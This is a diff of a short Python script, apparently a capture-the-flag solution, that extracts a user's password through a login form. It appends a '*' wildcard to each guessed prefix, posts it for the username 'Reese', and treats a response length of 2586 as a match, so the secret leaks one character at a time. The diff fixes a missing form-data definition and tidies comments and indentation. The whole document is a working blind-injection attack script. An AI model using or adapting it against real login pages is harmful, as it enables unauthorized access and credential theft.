@@ -5,27 +5,26 @@
 import requests
 from string import ascii_lowercase, ascii_uppercase
 
-url = 'http://138.68.156.206:32567/login' #insert your url here
-headers = {'Host': '138.68.156.206:32567', #use burp to grab this header
+url = 'http://138.68.156.206:32567/login' #change this
+headers = {'Host': '138.68.156.206:32567', #grab this from burp
 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
 'Content-Type': 'application/x-www-form-urlencoded',
 'Content-Length': '29',
 'Connection': 'close'}
 
-chars = ascii_lowercase + ascii_uppercase + '0123456789_{}()' #we want to go through the whole alphabet and numbers
-passwd = '' 
+chars = ascii_lowercase + ascii_uppercase + '0123456789_{}()'
+passwd = ''
 
 while(1):
-        for char in chars:
-                tmp = passwd + char + '*' #create a temp password
-                r = requests.post(url, headers=headers, data=data) #and post
+	for char in chars:
+		tmp = passwd + char + '*'
+		data = {'username':'Reese','password':tmp} #this is what we'll be posting
+		r = requests.post(url, headers=headers, data=data)
 
-                if r.headers['Content-Length'] == '2586': #if it returs a certain length it means that character is part of the password
-                        passwd += char
-                elif char==')':
-                        print (passwd)
-                        break
+		if r.headers['Content-Length'] == '2586':
+			passwd += char
+		elif char==')':
+			print (passwd)
+			break
 
 print (passwd)
-
-
